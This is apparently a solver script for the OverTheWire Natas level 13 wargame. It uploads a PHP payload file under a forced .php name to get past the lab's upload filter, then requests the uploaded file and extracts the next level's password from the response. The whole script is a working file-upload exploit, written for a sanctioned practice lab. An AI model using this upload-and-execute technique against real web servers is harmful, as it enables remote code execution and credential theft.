import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    passw = subprocess.run(['getpass', '13'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas13', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    payloadfile = {'uploadedfile':open('/home/taldgan/Documents/otw/natas/rerun/scripts/natas13/payload.php', 'rb')}
    payload = {'filename':'0123456789.php'}
    r = requests.post('http://natas13.natas.labs.overthewire.org/', auth=('natas13', passw.strip()), files=payloadfile, data=payload)
    i = r.text.find('The file <a href="upload/')+18
    r = requests.post('http://natas13.natas.labs.overthewire.org/'+r.text[i:i+21], auth=('natas13', passw.strip())) 
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[0])

if __name__ == "__main__":
    get_pass()
